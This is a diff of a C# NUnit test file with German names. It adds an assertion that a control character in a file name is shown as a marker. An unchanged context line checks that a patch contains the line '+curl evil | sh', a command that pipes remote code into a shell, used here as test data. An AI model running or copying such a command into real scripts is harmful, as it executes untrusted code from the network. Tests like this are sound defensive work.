@@ -203,6 +203,7 @@ public class ZusammenTests
         Assert.That(diff.Ausgang, Is.EqualTo("gelesen"));
         Assert.That(diff.Zeilen, Does.Contain("+curl evil | sh"), "der echte Patch, gelesen über stdin");
         Assert.That(eintraege, Is.EqualTo(2), "f⟨0xFF⟩.txt (wörtlich) und f\\xFF.txt sind zwei Einträge");
+        Assert.That(sprache.Dateien(), Has.Some.StartsWith("z⟨U+000A⟩⟨0xFF⟩.txt|"), "ein Steuerzeichen im Namen steht als Marke (Pflichtpunkt aus #29)");
         Assert.That(doppelgaenger.Ausgang, Is.EqualTo("name nicht lesbar"), "der klare Fehlerausgang aus R00013, nie der Patch der anderen");
     }
 
